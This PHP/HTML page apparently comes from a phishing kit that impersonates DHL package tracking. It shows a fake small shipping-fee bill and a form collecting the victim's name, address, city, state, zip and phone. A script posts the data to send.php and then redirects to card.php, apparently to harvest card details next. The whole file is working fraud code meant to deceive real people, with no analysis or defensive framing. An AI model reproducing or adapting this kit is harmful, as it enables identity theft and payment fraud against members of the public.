<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>myDHL - Tracking</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/cdns/bs.css">
<link rel="stylesheet" href="res/style.css">
<link rel="icon" href="res/icon2.png">
</head>
<body style="background:#eee">
<header class="container p-2" >
    <div class="row">
        <div class="col text-left">
            <img src="res/logo_exp.png" >
        </div>
    </div>
</header>

<section class="container-fluid">
<div class="container py-5 text-center bg-white" style="width:500px; max-width:100%;">

<div class="text-left">
<h4><?php echo getLang("_BILLING_TITLES")[0];?></h4>
<table style="font-size:0.8em; margin:26px 0; padding:0 10px;">
<tr>
<th ><?php echo getLang("_BILLING_TABLE")[0];?></th>
<td class="px-2"></td>
</tr>
<tr>
    <td><?php echo date("D , M Y"); ?> -  <?php echo getLang("_BILLING_TABLE")[1];?></td>
    
</tr>
<tr>
<th><?php echo getLang("_BILLING_TABLE")[2];?></th>
<td>1.2 kg</td>
</tr>
<tr>
<th><?php echo getLang("_BILLING_TABLE")[3];?></th>
<td>1</td>
</tr>
<tr>
<th><?php echo getLang("_BILLING_TABLE")[4];?></th>
<td>1.2 kg</td>
</tr>
</table>


<table class="table table-sm" style="font-size:0.9em;">
<tr>
<td><?php echo getLang("_BILLING_TABLE")[5];?>: </td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 2.73 </td>
</tr>
<tr>
<td><?php echo getLang("_BILLING_TABLE")[6];?>: </td>
<td><span style="margin-right:5px;"> <?php echo $currency;?></span> 0.70 </td>
</tr>
<tr>
<td> <?php echo getLang("_BILLING_TABLE")[7];?>: </td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 0.14</td>
</tr>
<tr style="font-weight:bold;">
<td> <?php echo getLang("_BILLING_TABLE")[8];?>:</td>
<td><span style="margin-right:5px;"><?php echo $currency;?></span> 3.57</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</table>

</div>
<div class="form p-3" style="background:#eee; ">

<div class="form-group">
    <input type="text" class="form-control" id="d0" placeholder="<?php echo getLang("_BILLING_INPUTS")[0];?>">
</div>

<div class="form-group ">
  <input type="text" inputmode="numeric"  class="form-control" id="d1" placeholder="<?php echo getLang("_BILLING_INPUTS")[1];?>">
</div>


<div class="form-group">
 
    <input type="text" inputmode="numeric"  class="form-control" id="d2" placeholder="<?php echo getLang("_BILLING_INPUTS")[2];?>">
</div>

<div class="form-group">
 
    <input type="text" inputmode="numeric"  class="form-control" id="d3" placeholder="<?php echo getLang("_BILLING_INPUTS")[3];?>">
</div>

<div class="form-group">
 
    <input type="text" inputmode="numeric" class="form-control" id="d4" placeholder="<?php echo getLang("_BILLING_INPUTS")[4];?>">
</div>

<div class="form-group">
    <input type="text" inputmode="numeric"  class="form-control" id="d5" placeholder="<?php echo getLang("_BILLING_INPUTS")[5];?>">
</div>



<div class="form-group">
<button onclick="sendCard()" class="btn btn-success p-2 my-4 w-100"><?php echo getLang("_CONTINUE");?></button>
</div>
</div>





</div>
</section>


<footer class="container-fluid">
<div class="container" >
<div class="row">
    <div class="col-sm-6 text-lg-left text-center">
        <?php echo getLang("_FOOTER_LINKS")[0];?>
    </div>
    <div class="col-sm-6 text-lg-right text-center">
        <?php echo getLang("_FOOTER_LINKS")[1];?>
    </div>
</div>
</div>
</footer>



<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style=" width:60px;">
</div>
</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>


var allowSubmit;
var abortVal = true;
var seconds = 2000;

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=6; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 
}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){

        $(".loader").show();
        
        $.post("send.php", 
			{	
                name:$("#d0").val(),
				address:$("#d1").val(),
                state:$("#d2").val(),
				city:$("#d3").val(),
				zip:$("#d4").val(),
                phone:$("#d5").val()
			
			}, function(done){
               setTimeout(() => {
                window.location="card.php";
               }, seconds);
                   
                
			}
		
		);

    }
}
</script>
</body>
</html>